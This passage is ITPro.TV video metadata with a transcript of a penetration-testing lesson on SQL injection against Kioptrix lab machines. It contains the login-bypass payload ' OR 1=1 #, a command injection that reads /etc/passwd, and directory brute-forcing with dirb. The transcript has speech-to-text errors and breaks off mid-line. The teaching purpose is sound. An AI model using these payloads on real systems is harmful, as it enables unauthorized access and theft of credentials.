00:24:16.938\n[MUSIC]\n\n452\n00:24:16.938 --> 00:24:19.385\nThank you for watching ITPRO.TV.\n\n",
          "vimeoId": "202939926"
        },
        {
          "description": "In this episode, Dan and Mike begin their look at SQL injection. They discuss what SQL injection is and where the vulnerability occurs. They demonstrate performing a SQL injection through a form on a web page as well as by injecting a command in a URL.",
          "length": "1944",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-8-1-1-sql_injection-020317-PGM.00_32_10_07.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-8-1-1-sql_injection-020317-PGM.00_32_10_07.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-8-1-1-sql_injection-020317-PGM.00_32_10_07.Still001-sm.jpg",
          "title": "SQL Injection",
          "transcript": "WEBVTT\n\n1\n00:00:00.008 --> 00:00:04.398\nWelcome to ITPro.TV, I'm your host-\n&gt;&gt; [CROSSTALK]\n\n2\n00:00:04.398 --> 00:00:08.512\n[MUSIC]\n\n3\n00:00:08.512 --> 00:00:10.316\n&gt;&gt; You're watching ITPro.TV.\n\n4\n00:00:10.316 --> 00:00:15.230\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITPro.TV.\n\n5\n00:00:15.230 --> 00:00:18.950\nI'm your host Mike Roderick, and\ntoday we're doing penetration testing.\n\n6\n00:00:18.950 --> 00:00:23.560\nAnd in this episode, we're gonna be\ntaking a look at a very common attack\n\n7\n00:00:23.560 --> 00:00:25.920\nvector that we see out there in the wild.\n\n8\n00:00:25.920 --> 00:00:28.420\nAnd a really fun one to kinda work with.\n\n9\n00:00:28.420 --> 00:00:32.390\nBut a tricky one, is SQL Injection.\n\n10\n00:00:32.390 --> 00:00:37.610\nAnd here to make the mysterious\nless mysterious is Mr.\n\n11\n00:00:37.610 --> 00:00:39.020\nDaniel Lowry, welcome back Daniel.\n\n12\n00:00:39.020 --> 00:00:40.350\n&gt;&gt; Hey Mike, how's it going today?\n\n13\n00:00:40.350 --> 00:00:43.720\nYes, we are moving into the realm of\nSQL Injection ladies and gentlemen.\n\n14\n00:00:43.720 --> 00:00:46.560\nGlad to be back in the studio with you\nguys cuz we're continuing on with our\n\n15\n00:00:46.560 --> 00:00:48.470\npenetration testing series.\n\n16\n00:00:48.470 --> 00:00:52.130\nAnd if, I say this a lot,\nif you've ever set some security and\n\n17\n00:00:52.130 --> 00:00:54.520\nhopefully if you're here\nwatching this you probably have.\n\n18\n00:00:54.520 --> 00:00:59.510\nMight have done something security plushes\nor along those lines, learned about some\n\n19\n00:00:59.510 --> 00:01:03.430\nsecurity and that's what sparked you\ninto wanting to watch this series.\n\n20\n00:01:03.430 --> 00:01:06.250\nAnd if you've done that,\nif you've initiated a bit into security,\n\n21\n00:01:06.250 --> 00:01:07.480\nyou've heard about SQL Injection.\n\n22\n00:01:07.480 --> 00:01:12.000\nBecause, like Mike said,\nit's a very common attack factor.\n\n23\n00:01:12.000 --> 00:01:14.580\nBut it also is a little weird, okay?\n\n24\n00:01:14.580 --> 00:01:16.840\nAnd when I say weird what I mean is,\nbasically,\n\n25\n00:01:16.840 --> 00:01:19.952\nyou're taking the bowl of spaghetti and\nyou're throwing it against the wall.\n\n26\n00:01:19.952 --> 00:01:23.150\nAnd going, something stuck there,\nokay great,\n\n27\n00:01:23.150 --> 00:01:26.358\nlet's try that, let's continue\ndown that line of reasoning.\n\n28\n00:01:26.358 --> 00:01:31.850\nIt's an art more than a science really,\nat least initially.\n\n29\n00:01:31.850 --> 00:01:36.220\nAnd once you get past that,\nthe fact that a SQL\n\n30\n00:01:36.220 --> 00:01:39.530\ninjection is possible then it starts\nbecoming more of science than an art.\n\n31\n00:01:39.530 --> 00:01:45.420\nSo, initially trying to find\nsites that are SQL injectionable,\n\n32\n00:01:45.420 --> 00:01:48.220\nthat's a good way to say it.\n\n33\n00:01:48.220 --> 00:01:51.810\nVulnerable to sequel problems, then you\n\n34\n00:01:51.810 --> 00:01:56.510\ncan get in to using your knowledge\nto sequel to exploit the machine.\n\n35\n00:01:56.510 --> 00:01:57.190\nSo, let's start here.\n\n36\n00:01:57.190 --> 00:02:01.230\nLet's talk about what exactly is a sequel\ninjection, set the stage really quickly.\n\n37\n00:02:01.230 --> 00:02:04.680\nSequel injection is basically\ntrying to find a web app or\n\n38\n00:02:04.680 --> 00:02:09.060\na website that basically\nis running SQL queries.\n\n39\n00:02:09.060 --> 00:02:13.170\nIt allows you to input and\nthat input becomes part of the SQL query.\n\n40\n00:02:13.170 --> 00:02:15.880\nAnd then it queries the database,\nand the database returns results and\n\n41\n00:02:15.880 --> 00:02:20.560\nit gets formatted appropriately and\nbecomes the output to a website.\n\n42\n00:02:20.560 --> 00:02:22.480\nThat's it, soup to nuts, start to finish.\n\n43\n00:02:22.480 --> 00:02:28.180\nThe problem comes in when,\nas always, unsanitized input,\n\n44\n00:02:28.180 --> 00:02:33.230\nthey're not checking what\nkind of input is going in.\n\n45\n00:02:33.230 --> 00:02:37.952\nIf you don't do that, well then I can\nsay well don't put that in there,\n\n46\n00:02:37.952 --> 00:02:42.910\nput this in there and it okay,\nthis isn't proper area for me to look for\n\n47\n00:02:42.910 --> 00:02:47.590\nsomething that I'm going to add\nto a SQL query, so I'll take it.\n\n48\n00:02:47.590 --> 00:02:52.100\nSo if you're not checking there,\nthat can definitely cause you problems.\n\n49\n00:02:52.100 --> 00:02:52.920\nOf course what does that do?\n\n50\n00:02:52.920 --> 00:02:58.360\nIt allows us to issue arbitrary\nSQL commands to our website there.\n\n51\n00:02:58.360 --> 00:03:03.010\n&gt;&gt; So really it's not a problem\nwith the SQL server in this case.\n\n52\n00:03:03.010 --> 00:03:05.850\nI mean the SQL server's doing what it's\nsupposed to do, processing commands,\n\n53\n00:03:05.850 --> 00:03:08.590\nthe problem is why did\nthat website let me,\n\n54\n00:03:08.590 --> 00:03:11.230\na visitor,\nissue a command in the first place.\n\n55\n00:03:11.230 --> 00:03:12.360\n&gt;&gt; Right, nail in the head.\n\n56\n00:03:12.360 --> 00:03:13.560\nMike's exactly right.\n\n57\n00:03:13.560 --> 00:03:15.380\nThe SQL server has no issue,\n\n58\n00:03:15.380 --> 00:03:19.740\nit's the front end to that server\nthat is causing the problem.\n\n59\n00:03:19.740 --> 00:03:26.860\nIt's allowing you, as a non-admin,\nto input SQL data or commands.\n\n60\n00:03:26.860 --> 00:03:30.410\nAll right, so\nthat was what the problem was.\n\n61\n00:03:30.410 --> 00:03:31.760\nWhere can you do this?\n\n62\n00:03:31.760 --> 00:03:33.370\nYou can do this in\na couple of ways any time,\n\n63\n00:03:33.370 --> 00:03:35.540\nif you have may be like an input box.\n\n64\n00:03:35.540 --> 00:03:37.580\nUsually we see this in form of a user and\n\n65\n00:03:37.580 --> 00:03:40.795\na password fields,\nsomething of that nature.\n\n66\n00:03:40.795 --> 00:03:44.450\nMaybe if you're asked,\nit has like a drop down menu and\n\n67\n00:03:44.450 --> 00:03:48.590\nhas a few different options available for\nyou.\n\n68\n00:03:48.590 --> 00:03:52.820\nThose could be part of a SQL statement,\nso when you choose your language or\n\n69\n00:03:52.820 --> 00:03:56.550\nsomething of that effect, it actually\nputs language equals da da da da\n\n70\n00:03:56.550 --> 00:04:00.620\ninside of that SQL statement and\nqueries accordingly, okay.\n\n71\n00:04:00.620 --> 00:04:01.840\nSo you can see it there.\n\n72\n00:04:01.840 --> 00:04:08.010\nYou can see it in just anywhere there's an\ninput field or input to the site itself.\n\n73\n00:04:08.010 --> 00:04:12.086\nOr it's just straight in to the URL,\nwhich we will actually use quite a bit.\n\n74\n00:04:12.086 --> 00:04:17.129\nWe're gonna start with very simplistic\nSQL injection so that we can get and\n\n75\n00:04:17.129 --> 00:04:22.348\nidea what its look like, how it reacts,\nwhat happens and move on from there.\n\n76\n00:04:22.348 --> 00:04:26.716\nActually, I have three SQL\nservers running right now and\n\n77\n00:04:26.716 --> 00:04:29.997\nthey all three have\ntheir own web front in.\n\n78\n00:04:29.997 --> 00:04:32.285\nI grab these guys from vonehub.com.\n\n79\n00:04:32.285 --> 00:04:36.075\nDon't forget to go on there and grab\nthese so that you can follow along and\n\n80\n00:04:36.075 --> 00:04:37.420\nplay with us.\n\n81\n00:04:37.420 --> 00:04:41.771\nThey will be the kioptrix,\nit's a weird one,\n\n82\n00:04:41.771 --> 00:04:48.357\nthe K-I-O-P-T-R-I-X machines and\nI got, 1.1, 1.2 and\n\n83\n00:04:48.357 --> 00:04:53.394\n1.3, which are oddly named\nwhen you fire them up.\n\n84\n00:04:53.394 --> 00:04:55.991\nKioptrix two, three and four.\n\n85\n00:04:55.991 --> 00:04:57.560\n&gt;&gt; [LAUGH]\n&gt;&gt; So yeah.\n\n86\n00:04:57.560 --> 00:05:00.440\nIt can definitely twirl your\nhead around a little bit,\n\n87\n00:05:00.440 --> 00:05:05.430\nit was fun going, hold on what's going\non again, keeping things straight.\n\n88\n00:05:05.430 --> 00:05:11.430\nI also made in my Linux machine,\nI went into the Etsy host file.\n\n89\n00:05:11.430 --> 00:05:13.540\nAnd I'm gonna show you that really\nquickly cuz it's a good thing to do.\n\n90\n00:05:13.540 --> 00:05:15.920\nIt helps so\nyou don't have to work with ip addresses.\n\n91\n00:05:15.920 --> 00:05:19.380\nIf you go up in,\nyou should do something like cat or\n\n92\n00:05:19.380 --> 00:05:25.044\nif you wanna open it nano/etsy/hosts.\n\n93\n00:05:25.044 --> 00:05:30.610\nJust made some entries there just\nlike that you put the ip address.\n\n94\n00:05:30.610 --> 00:05:33.060\nAnd then a space and\nwhatever you wanna call it.\n\n95\n00:05:33.060 --> 00:05:37.380\nI just call it a kioptrix-3,\nkey kioptirx-1, and kioptrix-4, so\n\n96\n00:05:37.380 --> 00:05:43.310\nI can easily just use those names\ninstead typing on an IP address.\n\n97\n00:05:43.310 --> 00:05:43.980\n&gt;&gt; Very smart.\n\n98\n00:05:43.980 --> 00:05:48.150\n&gt;&gt; Yeah, so do that, it'll help you out,\nAlt Ctrl x over there.\n\n99\n00:05:48.150 --> 00:05:51.990\nWhat else do I want you guys to know about\nthese boxes, I think that's about it.\n\n100\n00:05:51.990 --> 00:05:55.280\nJust get them in your environment, fire\nthem up, download them from vulnhub, and\n\n101\n00:05:55.280 --> 00:05:58.530\nthey will help us with this you can\nfollow along and do what we're gonna do.\n\n102\n00:05:58.530 --> 00:06:02.410\nSo let's start with kioptrix,\nlooks like number one here.\n\n103\n00:06:02.410 --> 00:06:04.700\nSo what we're gonna do is I'm\ngonna open up my browser.\n\n104\n00:06:04.700 --> 00:06:10.140\nAnd of course we've done all our\ntypical scanning and enumeration right.\n\n105\n00:06:10.140 --> 00:06:12.530\nWe've run nmap -a -t4.\n\n106\n00:06:12.530 --> 00:06:18.190\nAll ports we found that is running a web\nsite and also maybe that they're SQL.\n\n107\n00:06:18.190 --> 00:06:20.600\nMaybe we've run nitko against it.\n\n108\n00:06:20.600 --> 00:06:23.930\nNikto, I always say it nitko, it's nikto.\n\n109\n00:06:23.930 --> 00:06:26.312\nI'm dyslexic so help me out here.\n\n110\n00:06:26.312 --> 00:06:28.910\n[LAUGH] Run that scan,\nlook for vulnerabilities.\n\n111\n00:06:28.910 --> 00:06:33.560\nWell I saw some SQL entries on that, so\nthere we go, I know sequel is running.\n\n112\n00:06:33.560 --> 00:06:36.110\nSo let me fire that guy up here.\n\n113\n00:06:36.110 --> 00:06:42.625\nJust to browse the http:// and\nthen it was, h, yeah.\n\n114\n00:06:42.625 --> 00:06:47.410\nKioptrix-.com, like that.\n\n115\n00:06:47.410 --> 00:06:51.762\nAnd there you go, it's a simple page, cuz\nwe're gonna do something very simple and\n\n116\n00:06:51.762 --> 00:06:53.630\nwe have to input fields.\n\n117\n00:06:53.630 --> 00:06:55.530\nOne's a username, one's a password.\n\n118\n00:06:55.530 --> 00:06:58.040\nAnd this is where I talk about\nthat whole scatter gun approach,\n\n119\n00:06:58.040 --> 00:06:59.780\nthe throwing the spaghetti on the wall.\n\n120\n00:06:59.780 --> 00:07:04.260\nIs I'm just gonna try some SQL and\nsee what happens, all right,\n\n121\n00:07:04.260 --> 00:07:06.880\ncuz that's a lot what we do, right.\n\n122\n00:07:06.880 --> 00:07:08.640\nJust to see if it works.\n\n123\n00:07:08.640 --> 00:07:13.050\nYou can check out, look for\nSQL injection cheat sheets.\n\n124\n00:07:13.050 --> 00:07:14.610\nJust do a Google search for that.\n\n125\n00:07:14.610 --> 00:07:16.760\nI think pentestmonkey has some on there.\n\n126\n00:07:16.760 --> 00:07:18.140\nHe's got a good list of that.\n\n127\n00:07:18.140 --> 00:07:20.740\nExploit DB also has a good one.\n\n128\n00:07:20.740 --> 00:07:23.020\nI'll put the links to\nthat in the show notes so\n\n129\n00:07:23.020 --> 00:07:24.670\nyou can peruse those cheat sheets.\n\n130\n00:07:24.670 --> 00:07:26.480\nI'm sure they're not\nthe only game in town.\n\n131\n00:07:26.480 --> 00:07:27.600\nFind ones that you like.\n\n132\n00:07:27.600 --> 00:07:30.170\nMaybe there's some that are more thorough,\nsome that are less thorough.\n\n133\n00:07:30.170 --> 00:07:35.440\nMaybe there are, you find a site that has\nthem and they make more sense to you.\n\n134\n00:07:35.440 --> 00:07:38.260\nIt just depends on teaching methods and\nstyles.\n\n135\n00:07:38.260 --> 00:07:40.180\nSo I'll find you a cheat\nsheet that can very helpful.\n\n136\n00:07:40.180 --> 00:07:45.050\nAnd you can just start throwing these\nthings at your input and see if they work.\n\n137\n00:07:45.050 --> 00:07:47.140\nAnd that's it,\nthat whole scattergun approach.\n\n138\n00:07:47.140 --> 00:07:51.109\nIf I go to the username portion here and\n\n139\n00:07:51.109 --> 00:07:54.836\nI just say, blah user, like that.\n\n140\n00:07:54.836 --> 00:07:56.379\nActually, I don't even need\nthat to be honest with you.\n\n141\n00:07:56.379 --> 00:08:01.107\nI'm just gonna add the single quote,\nSpace.\n\n142\n00:08:01.107 --> 00:08:07.080\nOr, 1 = 1, and then a hash, like that.\n\n143\n00:08:07.080 --> 00:08:10.650\nI hit Return, and look what it does.\n\n144\n00:08:10.650 --> 00:08:14.880\nIt allows me access into this\nbasic administrative console.\n\n145\n00:08:14.880 --> 00:08:15.520\n&gt;&gt; Wow.\n&gt;&gt; Right?\n\n146\n00:08:15.520 --> 00:08:19.420\nSo, Mike you know a bit about SQL here.\n\n147\n00:08:21.460 --> 00:08:24.190\nIt's interesting to know what's\ngoing on in the background.\n\n148\n00:08:24.190 --> 00:08:27.656\n&gt;&gt; It really is cuz I'm sure you're\ngonna show how we work through this,\n\n149\n00:08:27.656 --> 00:08:31.593\nwe're really trying to figure out what\nSQL statement they're using in the back\n\n150\n00:08:31.593 --> 00:08:34.470\nof this code as we're putting that,\nI think in this case,\n\n151\n00:08:34.470 --> 00:08:37.500\na little single apostrophe or\none equals one.\n\n152\n00:08:37.500 --> 00:08:41.040\nAnd we know with an or statement,\neither side has to ring true, right?\n\n153\n00:08:41.040 --> 00:08:45.630\nWe don't know username, or we might or\nmight not, or one equals one.\n\n154\n00:08:45.630 --> 00:08:47.420\nWell does one equal one?\n\n155\n00:08:47.420 --> 00:08:48.010\n&gt;&gt; Usually.\n\n156\n00:08:48.010 --> 00:08:50.470\n&gt;&gt; Usually in most math systems right?\n\n157\n00:08:50.470 --> 00:08:55.590\nSo even thought the username part didn't\nring true, the second part did and\n\n158\n00:08:55.590 --> 00:08:59.980\ntherefore it allowed me to continue on or\nif we could start to evaluate that SQL\n\n159\n00:08:59.980 --> 00:09:02.310\nstatement behind there and\nsee what we can do.\n\n160\n00:09:02.310 --> 00:09:05.980\n&gt;&gt; Yeah what's interesting about\nthis as well is you get this cool\n\n161\n00:09:05.980 --> 00:09:09.380\nwelcome to the basic administrative web\nconsole ping machine on the network.\n\n162\n00:09:11.070 --> 00:09:11.890\nSo it's running ping.\n\n163\n00:09:11.890 --> 00:09:16.282\nSo if I say, you know,\ngive it it's own loop back address\n\n164\n00:09:16.282 --> 00:09:22.020\n127.0.0.1, like that, hit enter,\nit's trying to connect.\n\n165\n00:09:22.020 --> 00:09:23.540\nAnd cool, I get ping output.\n\n166\n00:09:23.540 --> 00:09:25.190\nSo what is it doing?\n\n167\n00:09:25.190 --> 00:09:26.410\nIt's running ping.\n\n168\n00:09:26.410 --> 00:09:30.910\nRemember we did a show and\nwe talked about command injection, right?\n\n169\n00:09:30.910 --> 00:09:33.610\nWell, if it's just doing ping in Linux,\n\n170\n00:09:33.610 --> 00:09:36.730\nI can use a semicolon and\nadd commands to it.\n\n171\n00:09:36.730 --> 00:09:43.870\nSo if I come back and I just do semicolon,\ncaps, FC slash password.\n\n172\n00:09:43.870 --> 00:09:47.030\nLet's see what happens.\n\n173\n00:09:47.030 --> 00:09:50.070\nHey look, there's the FC password file.\n\n174\n00:09:50.070 --> 00:09:50.775\n&gt;&gt; That was too darn easy.\n\n175\n00:09:50.775 --> 00:09:51.933\n&gt;&gt; That's a little too easy for us, right?\n\n176\n00:09:51.933 --> 00:09:54.160\nThat's fun stuff.\n\n177\n00:09:54.160 --> 00:09:57.050\nAnd there's some users,\nwe've got Harold, we've got John.\n\n178\n00:09:57.050 --> 00:09:58.820\nLot of cool stuff going on there.\n\n179\n00:09:58.820 --> 00:10:04.220\nInteresting things, there was great\ninroad into exploiting this machine.\n\n180\n00:10:04.220 --> 00:10:05.420\nVery cool stuff.\n\n181\n00:10:05.420 --> 00:10:07.140\nBut that was pretty simple.\n\n182\n00:10:07.140 --> 00:10:08.260\nLet's take a look at another one here.\n\n183\n00:10:08.260 --> 00:10:09.270\nLet me close these down.\n\n184\n00:10:09.270 --> 00:10:12.030\nIt's a very similar attack.\n\n185\n00:10:12.030 --> 00:10:19.900\nI'm gonna go to keoptricks4.com.\n\n186\n00:10:19.900 --> 00:10:21.460\nAnd again, very similar.\n\n187\n00:10:21.460 --> 00:10:23.760\nWe have a log in screen.\n\n188\n00:10:23.760 --> 00:10:25.720\nUsername and password.\n\n189\n00:10:25.720 --> 00:10:27.991\nI wonder if our little\nattack will work here?\n\n190\n00:10:27.991 --> 00:10:29.512\nWell we'll try it again, same kinda thing.\n\n191\n00:10:29.512 --> 00:10:34.029\nSingle quote, OR 1=1 # and\n\n192\n00:10:34.029 --> 00:10:41.420\njust put whatever in the password and\nhit login.\n\n193\n00:10:41.420 --> 00:10:43.940\nWrong username or password, okay.\n\n194\n00:10:43.940 --> 00:10:46.320\nWell maybe if I leave\nthe password part out.\n\n195\n00:10:46.320 --> 00:10:53.130\nIf I say single quote or one equals\none hash just leave the password out.\n\n196\n00:10:54.750 --> 00:10:59.410\nNow, so obviously the user\nname portion is looking for\n\n197\n00:10:59.410 --> 00:11:01.500\na certain string of data, right.\n\n198\n00:11:01.500 --> 00:11:04.850\nSo that's why that's not working,\nbecause I'm not able to or it's.\n\n199\n00:11:04.850 --> 00:11:06.020\nI'm not able to say this, or\n\n200\n00:11:06.020 --> 00:11:09.270\nthis, it's just saying,\nthis is what it should look like.\n\n201\n00:11:09.270 --> 00:11:10.800\nThis does not look like that.\n\n202\n00:11:10.800 --> 00:11:12.270\nSo that's bad, that's wrong.\n\n203\n00:11:12.270 --> 00:11:15.840\nAnd of course the password field\nwas either blank or wrong so\n\n204\n00:11:15.840 --> 00:11:16.450\nI'm getting that wrong.\n\n205\n00:11:16.450 --> 00:11:20.610\nBut what if I reverse the process, right?\n\n206\n00:11:20.610 --> 00:11:21.440\nWhat if I do that?\n\n207\n00:11:21.440 --> 00:11:23.170\n&gt;&gt; I really like it.\n\n208\n00:11:23.170 --> 00:11:23.950\n&gt;&gt; I do too.\n\n209\n00:11:23.950 --> 00:11:28.620\nNow with this obviously that\npassword area is looking for\n\n210\n00:11:28.620 --> 00:11:31.020\na specific, like an actual user again.\n\n211\n00:11:31.020 --> 00:11:33.840\nSo I would need to enumerate\nsome user accounts.\n\n212\n00:11:33.840 --> 00:11:38.391\nLet's give that a shot actually,\nI think that this would be\n\n213\n00:11:38.391 --> 00:11:43.035\na cool place to use DIR,\nDirBuster or GoBuster, whatever,\n\n214\n00:11:43.035 --> 00:11:48.880\nany one of those cool busters that\nbasically brute forces web directories.\n\n215\n00:11:48.880 --> 00:11:54.836\nRight, so let's do that because I found\nsome interesting stuff when I did that,\n\n216\n00:11:54.836 --> 00:11:56.610\nenumerating this box.\n\n217\n00:11:56.610 --> 00:12:02.669\nSo if I did did derb and\nI say http:// and I say kiorptix-4.com,\n\n218\n00:12:02.669 --> 00:12:09.564\nand then I say, I'm gonna use the big\nword file that they have, it basically,\n\n219\n00:12:09.564 --> 00:12:16.910\nit has a dictionary of words that it tries\nto use as common directory names, right?\n\n220\n00:12:16.910 --> 00:12:21.495\nSo I'm gonna use the big\nword file which is\n\n221\n00:12:21.495 --> 00:12:25.951\nlocated in user/share/wordlists and\n\n222\n00:12:25.951 --> 00:12:29.881\nI think it's big.tx big .txt,\n\n223\n00:12:29.881 --> 00:12:34.346\nno it's dirb/big.txt, there we go.\n\n224\n00:12:34.346 --> 00:12:38.987\nIt's generating the world list,\nit's gonna run through this thing,\n\n225\n00:12:38.987 --> 00:12:42.200\nI can't remember how long this takes.\n\n226\n00:12:42.200 --> 00:12:45.590\nCouldn't resolve host, what did I do?\n\n227\n00:12:45.590 --> 00:12:47.560\nI spelled keyoptics wrong,\nthat would be a problem.\n\n228\n00:12:48.950 --> 00:12:51.050\nIt is a twisty little,\nI don't know how to name this thing.\n\n229\n00:12:51.050 --> 00:12:54.372\nLet's keep up, tricks, let's try that.\n\n230\n00:12:54.372 --> 00:12:57.170\n&gt;&gt; [LAUGH]\n&gt;&gt; Generating the word list.\n\n231\n00:12:57.170 --> 00:12:59.570\nAnd, hopefully it doesn't\ntake too very long.\n\n232\n00:12:59.570 --> 00:13:01.270\nThere we go.\nYou can see it kind of cranking through\n\n233\n00:13:01.270 --> 00:13:02.500\nall the words.\n\n234\n00:13:02.500 --> 00:13:06.510\nTrying to find, it found CGI Bin.\n\n235\n00:13:06.510 --> 00:13:09.700\nIt's found, here is a directory log out.\n\n236\n00:13:09.700 --> 00:13:11.430\nHere is another one, member.\n\n237\n00:13:11.430 --> 00:13:15.540\nOkay, that was pretty quick and\nit found five different directories.\n\n238\n00:13:17.130 --> 00:13:22.620\nAnd if I look through them I found one\ncalled John and one called Robert.\n\n239\n00:13:22.620 --> 00:13:25.610\nThose seem more like actual people,\n\n240\n00:13:25.610 --> 00:13:27.965\nlike I don't know why someone\nwould just name a directory John.\n\n241\n00:13:27.965 --> 00:13:30.090\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't know why someone would name\n\n242\n00:13:30.090 --> 00:13:34.260\na directory Robert other than they\nare users and they are their folders.\n\n243\n00:13:34.260 --> 00:13:35.390\n&gt;&gt; Definitely a good chance right?\n\n244\n00:13:35.390 --> 00:13:39.300\n&gt;&gt; Right, so definitely a good chance\nthat this might be two good users.\n\n245\n00:13:39.300 --> 00:13:40.100\nSo we'll try them.\n\n246\n00:13:40.100 --> 00:13:40.600\nLet's do that.\n\n247\n00:13:41.890 --> 00:13:44.330\nWe'll go here, we'll go back to try again.\n\n248\n00:13:45.420 --> 00:13:50.870\nAnd this time we will say John and then\nwhen we come down to the password area,\n\n249\n00:13:50.870 --> 00:13:56.230\nwe'll do our single quotation space or\n\n250\n00:13:56.230 --> 00:14:00.280\nspace one equals one space.\n\n251\n00:14:00.280 --> 00:14:06.140\nAnd your hash, hit return and\nnow I get my numbers\n\n252\n00:14:06.140 --> 00:14:10.350\ncontrol panel and it shows me the username\nand what his password actually is.\n\n253\n00:14:10.350 --> 00:14:13.010\nSo I have bypassed the law again.\n\n254\n00:14:13.010 --> 00:14:17.140\nSo my password field was not\nbeing sanitized very well even\n\n255\n00:14:17.140 --> 00:14:18.370\nthough they did with the username.\n\n256\n00:14:18.370 --> 00:14:20.350\nGod knows why they didn't\ndo it with the passwords.\n\n257\n00:14:20.350 --> 00:14:22.980\nBut they didn't and\nnow you can see how this works.\n\n258\n00:14:22.980 --> 00:14:27.550\nSo, giving you a good idea of getting\ninitiated into signal injection.\n\n259\n00:14:27.550 --> 00:14:31.320\n&gt;&gt; It might sound silly but you will\nfind that kind of thing out in the wild\n\n260\n00:14:31.320 --> 00:14:35.030\nwhere for some reason they just didn't\nget around to doing the other field or\n\n261\n00:14:35.030 --> 00:14:37.710\nthey mistakenly thought they were and\n\n262\n00:14:37.710 --> 00:14:42.740\nthey were not doing checks on\nthose inputs and it slips through.\n\n263\n00:14:42.740 --> 00:14:43.800\n&gt;&gt; Yeah, it happens.\n\n264\n00:14:43.800 --> 00:14:45.390\nGuys are out there coding\ntrying to bang away.\n\n265\n00:14:45.390 --> 00:14:48.530\nHe's got somebody over their shoulder\ngoing, when's that gonna get done?\n\n266\n00:14:48.530 --> 00:14:49.790\nWe need that by tonight.\n\n267\n00:14:49.790 --> 00:14:51.410\nIs that gonna be done,\nis that gonna be done?\n\n268\n00:14:51.410 --> 00:14:52.780\nSo they're hurrying, they're rushing.\n\n269\n00:14:52.780 --> 00:14:54.310\nYou gotta remember we're all humans.\n\n270\n00:14:54.310 --> 00:14:59.750\nWe make mistakes and these things\nhappen but as the penetration tester,\n\n271\n00:14:59.750 --> 00:15:04.370\nwhereas the bad actor that's out there in\nthe wild, are looking for those mistakes.\n\n272\n00:15:04.370 --> 00:15:07.140\nOne's looking for those mistakes to\nrectify them, the other one's looking for\n\n273\n00:15:07.140 --> 00:15:08.860\nthem to exploit them.\n\n274\n00:15:08.860 --> 00:15:10.420\nSo there it is.\n\n275\n00:15:10.420 --> 00:15:16.210\nAnd again our caveat for the day is\ndon't perform these attacks on machines\n\n276\n00:15:16.210 --> 00:15:21.480\nthat you do not have authorization for\nor that you own explicitly.\n\n277\n00:15:21.480 --> 00:15:24.250\nSo there we go,\ndon't do bad things to people.\n\n278\n00:15:24.250 --> 00:15:27.920\nIt's not nice, you don't wanna end up in\na hotel with a guy with a stick going,\n\n279\n00:15:27.920 --> 00:15:31.015\nI'm gonna hit you in the head with this\nif you don't lay down to your sleep.\n\n280\n00:15:31.015 --> 00:15:33.010\n[LAUGH] If you don't go to\nsleep I will put you to sleep.\n\n281\n00:15:34.150 --> 00:15:37.300\nSo there we go, that was pretty\nstraightforward, pretty simple.\n\n282\n00:15:37.300 --> 00:15:43.240\nAnd usually when you see a SQL\ninjection type of talk or\n\n283\n00:15:43.240 --> 00:15:45.760\nteaching, that's about as\nfar as you usually get.\n\n284\n00:15:45.760 --> 00:15:47.500\nBut that's not the end of the game.\n\n285\n00:15:47.500 --> 00:15:49.200\nWe went down a little bit deeper.\n\n286\n00:15:49.200 --> 00:15:52.050\nLet's talk error based enumeration.\n\n287\n00:15:52.050 --> 00:15:54.470\nWhat is error based enumeration?\n\n288\n00:15:54.470 --> 00:15:57.672\nIt doesn't happen often, but\nsometimes you do something,\n\n289\n00:15:57.672 --> 00:16:01.186\nyou type something into input, or\nyou do something and it's not,\n\n290\n00:16:01.186 --> 00:16:04.671\nOr doesn't work correctly, and\nthe SQL Server throws an error.\n\n291\n00:16:04.671 --> 00:16:08.430\nAnd that error comes out on the website,\nright?\n\n292\n00:16:08.430 --> 00:16:13.150\nSo, you tried to type something in,\nit says, error, your syntax is wrong.\n\n293\n00:16:13.150 --> 00:16:15.130\nThis happens sometimes, not a lot,\n\n294\n00:16:15.130 --> 00:16:17.890\nbecause it's a bad idea to\nallows those things to happen.\n\n295\n00:16:17.890 --> 00:16:20.930\n&gt;&gt; But again, it's another one of\nthose things where it's another step.\n\n296\n00:16:20.930 --> 00:16:24.430\nAnd when you're in a rush, when you're\nin a hurry, you might not think about,\n\n297\n00:16:24.430 --> 00:16:27.240\nhey, do I need to capture these errors?\n\n298\n00:16:27.240 --> 00:16:29.979\nCuz most sites nowadays have\ngotten better about it, right?\n\n299\n00:16:29.979 --> 00:16:32.178\nAnd you get that little\nfriendly splash screen,\n\n300\n00:16:32.178 --> 00:16:35.630\noops sorry couldn't find\nthe page you were looking for.\n\n301\n00:16:35.630 --> 00:16:39.200\nBut now and again,\nyou still see the actual error come up.\n\n302\n00:16:39.200 --> 00:16:42.430\nAnd, as Daniel said,\nthere can be a lot of good information.\n\n303\n00:16:42.430 --> 00:16:44.710\nOr if we're the company\n&gt;&gt; [LAUGH]\n\n304\n00:16:44.710 --> 00:16:46.560\n&gt;&gt; Really sensitive information that is\n\n305\n00:16:46.560 --> 00:16:49.070\ngetting exposed to unauthorized viewers.\n\n306\n00:16:49.070 --> 00:16:50.110\n&gt;&gt; Yeah, that's exactly right.\n\n307\n00:16:50.110 --> 00:16:52.575\nSo, if you do run across,\n\n308\n00:16:52.575 --> 00:16:56.190\nif you're ping testing,\nyou wanna try error based enumeration.\n\n309\n00:16:56.190 --> 00:17:00.630\nLook for\nerrors occurring from the website.\n\n310\n00:17:00.630 --> 00:17:04.920\nAnd if there's SQL, you see SQL,\nwell, now you know, well, I'm,\n\n311\n00:17:04.920 --> 00:17:09.990\nmaybe I can use that information to\nsuccessfully craft a SQL injection attack.\n\n312\n00:17:09.990 --> 00:17:14.330\nCuz it's giving you outputs that can\nlend you to realize these things.\n\n313\n00:17:14.330 --> 00:17:18.150\n&gt;&gt; Sometimes it'll even show you\nthe query that's being executed,\n\n314\n00:17:18.150 --> 00:17:21.430\nwhich is exactly what I need to\ncomplete a command or SQL injection.\n\n315\n00:17:21.430 --> 00:17:25.920\n&gt;&gt; Right, so let's take a look at what\na vulnerable server might look like.\n\n316\n00:17:25.920 --> 00:17:28.260\nI'm going to go to key objects three.\n\n317\n00:17:28.260 --> 00:17:30.080\nI know we're bouncing all over the place.\n\n318\n00:17:30.080 --> 